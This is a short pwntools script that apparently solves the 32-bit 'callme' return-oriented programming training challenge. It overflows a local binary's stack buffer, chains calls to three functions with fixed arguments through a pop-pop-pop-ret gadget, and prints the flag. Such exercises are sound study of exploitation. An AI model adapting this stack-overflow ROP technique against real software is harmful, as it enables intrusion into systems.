from pwn import *

callme_one = 0x080484f0
callme_two = 0x08048550
callme_three = 0x080484e0
pop_3_times_ret = 0x80487f9

payload = b"".join([
    b"A"*(32+12),
    p32(callme_one),
    p32(pop_3_times_ret),
    p32(0xdeadbeef),
    p32(0xcafebabe),
    p32(0xd00df00d),
    p32(callme_two),
    p32(pop_3_times_ret),
    p32(0xdeadbeef),
    p32(0xcafebabe),
    p32(0xd00df00d),
    p32(callme_three),
    p32(pop_3_times_ret),
    p32(0xdeadbeef),
    p32(0xcafebabe),
    p32(0xd00df00d),
])

p = process("./callme32")
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"correctly")
p.recvuntil(b"correctly")
flag = p.recv()
print(f"Flag : {flag}")
